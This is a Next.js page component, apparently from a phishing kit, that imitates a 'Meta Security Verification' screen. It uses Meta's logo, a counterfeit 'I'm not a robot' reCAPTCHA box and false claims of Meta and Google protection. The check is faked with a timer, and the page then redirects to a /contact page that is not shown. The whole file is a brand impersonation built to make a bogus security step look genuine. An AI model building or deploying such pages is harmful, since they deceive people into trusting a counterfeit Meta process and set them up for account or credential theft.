'use client';
import CheckMarkImage from '@/assets/images/checkmark.png';
import MetaImage from '@/assets/images/meta-image.png';
import ReCaptchaImage from '@/assets/images/recaptcha.png';
import axios from 'axios';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';

const Index = () => {
    const router = useRouter();
    const [isLoading, setIsLoading] = useState(false);
    const [isShowCheckMark, setIsShowCheckMark] = useState(false);

    const handleVerify = async () => {
        setIsLoading(true);
        try {
            // Giả lập verify API
            setTimeout(() => {
                setIsShowCheckMark(true);
                setIsLoading(false);
            }, 2000);
        } catch {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (isShowCheckMark) {
            const redirectTimeOut = setTimeout(() => {
                router.push('/contact');
            }, 1000);
            return () => {
                clearTimeout(redirectTimeOut);
            };
        }
    }, [isShowCheckMark, router]);

    return (
        <div className="flex min-h-screen items-center justify-center bg-white">
            <title>Meta Security Verification</title>
            <div className="w-full max-w-md p-6">
                {/* Meta Logo */}
                <div className="mb-6">
                    <Image 
                        src={MetaImage} 
                        alt="Meta" 
                        className="h-12 w-auto"
                    />
                </div>

                {/* Recaptcha Box */}
                <div className="mb-6 rounded-lg border border-gray-300 bg-gray-50 p-4">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-3">
                            <button
                                onClick={handleVerify}
                                disabled={isLoading || isShowCheckMark}
                                className="flex h-8 w-8 items-center justify-center rounded border-2 border-gray-400 bg-white focus:outline-none"
                            >
                                {isLoading ? (
                                    <div className="h-5 w-5 animate-spin rounded-full border-2 border-blue-500 border-t-transparent"></div>
                                ) : isShowCheckMark ? (
                                    <Image 
                                        src={CheckMarkImage} 
                                        alt="Verified" 
                                        className="h-5 w-5"
                                    />
                                ) : (
                                    <div className="h-5 w-5"></div>
                                )}
                            </button>
                            <span className="text-sm font-medium text-gray-700">
                                I'm not a robot
                            </span>
                        </div>
                        
                        <div className="flex flex-col items-center">
                            <Image 
                                src={ReCaptchaImage} 
                                alt="reCAPTCHA" 
                                className="h-8 w-8"
                            />
                            <span className="text-xs font-bold text-gray-600">reCAPTCHA</span>
                            <span className="text-[10px] text-gray-500">Privacy - Terms</span>
                        </div>
                    </div>
                </div>

                {/* Information Text */}
                <div className="space-y-3 text-sm text-gray-600">
                    <p>
                        This page is protected by Meta Security to ensure you're not a robot. 
                        This helps us combat automated threats and maintain platform integrity.
                    </p>
                    <p>
                        We use Google's reCAPTCHA technology for this security check. 
                        Your interaction with reCAPTCHA is subject to Google's Privacy Policy and Terms of Service.
                    </p>
                </div>

                {/* Loading State */}
                {isShowCheckMark && (
                    <div className="mt-4 text-center text-sm text-green-600">
                        ✅ Verification successful! Redirecting...
                    </div>
                )}
            </div>
        </div>
    );
};

export default Index;
